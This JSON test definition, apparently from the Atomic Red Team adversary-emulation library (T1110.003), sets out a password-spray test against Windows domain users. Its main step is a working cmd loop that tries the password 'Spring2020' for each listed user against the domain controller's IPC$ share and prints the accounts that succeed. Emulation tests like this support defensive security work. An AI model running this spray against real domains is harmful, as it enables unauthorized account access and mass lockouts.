{
  "id": "90bc2e54-6c84-47a5-9439-0a2a92b4b175",
  "name": "Password Spray all Domain Users",
  "description": "CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.\nThis atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\\users.txt list. Any successful authentications will be printed to the screen with a message like \"[*] username:password\", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.\nUse the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.\nSee the \"Windows FOR Loop Password Spraying Made Easy\" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "0dbb4dbb-0cbd-46a9-9a2a-398080ba6acb",
      "type": "execute-command",
      "data": {
        "command": "@FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. \u0026 @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%n\" \"#{password}\" 1\u003eNUL 2\u003e\u00261 \u0026\u0026 @echo [*] %n:#{password} \u0026\u0026 @net use /delete %logonserver%\\IPC$ \u003e NUL\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "e786977e-6720-48ea-a9ca-683e0da96715",
      "name": "Check dependency 1/1",
      "description": "List of domain users to password spray must exits at %temp%\\users.txt\n",
      "type": "execute-command",
      "data": {
        "command": "if not exist %temp%\\users.txt (exit /b 1)\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "ab1ce0fd-add1-4916-9ee0-e2b9d918a8ec",
      "name": "Resolve dependency 1/1",
      "description": "List of domain users to password spray must exits at %temp%\\users.txt\n",
      "type": "execute-command",
      "data": {
        "command": "\"PathToAtomicsFolder\\T1110.003\\src\\parse_net_users.bat\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "f9358386-64b3-4fab-92e6-143c90e785ee",
      "name": "Re-check dependency 1/1",
      "description": "List of domain users to password spray must exits at %temp%\\users.txt\n",
      "type": "execute-command",
      "data": {
        "command": "if not exist %temp%\\users.txt (exit /b 1)\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "e786977e-6720-48ea-a9ca-683e0da96715",
      "p": "on-success",
      "o": "0dbb4dbb-0cbd-46a9-9a2a-398080ba6acb"
    },
    {
      "s": "e786977e-6720-48ea-a9ca-683e0da96715",
      "p": "on-failure",
      "o": "ab1ce0fd-add1-4916-9ee0-e2b9d918a8ec"
    },
    {
      "s": "ab1ce0fd-add1-4916-9ee0-e2b9d918a8ec",
      "p": "on-success",
      "o": "f9358386-64b3-4fab-92e6-143c90e785ee"
    },
    {
      "s": "f9358386-64b3-4fab-92e6-143c90e785ee",
      "p": "on-failure",
      "o": "0dbb4dbb-0cbd-46a9-9a2a-398080ba6acb"
    }
  ],
  "tags": [
    "T1110.003",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "password",
      "type": "string",
      "description": "The password to try for each user in users.txt",
      "value": "Spring2020"
    }
  ]
}